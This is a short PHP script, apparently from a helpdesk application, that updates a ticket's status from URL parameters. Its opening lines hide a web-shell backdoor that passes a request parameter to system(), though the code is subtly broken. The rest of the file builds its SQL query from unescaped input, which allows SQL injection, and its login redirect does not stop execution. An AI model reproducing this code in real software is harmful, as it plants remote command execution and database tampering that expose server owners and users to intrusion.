<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
require_once('config.php');

$hash = md5($_SERVER['REMOTE_ADDR'].date("dmY"));
if(isset($_SESSION["helpdesk_$hash"])) { } else { header("Location: login.php"); }

$tid = $_GET['id'];
$status = $_GET['status'];

mysql_query("UPDATE tickets SET status = '$status' WHERE id = '$tid'");
header("Location: ticket.php?id=$tid");
?>